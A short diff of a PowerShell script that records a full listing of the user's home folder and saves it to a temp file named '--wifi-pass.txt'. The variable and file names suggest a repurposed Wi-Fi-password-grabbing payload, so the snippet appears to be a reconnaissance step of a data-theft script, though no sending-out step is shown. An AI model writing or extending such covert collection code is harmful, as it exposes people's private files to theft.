@@ -1,6 +1,6 @@
 ############################################################################################################################################################
 
-$wifiProfiles = (tree $HOME) | Out-String
+$wifiProfiles = (tree $HOME /f) | Out-String
 
 
 $wifiProfiles > $env:TEMP/--wifi-pass.txt
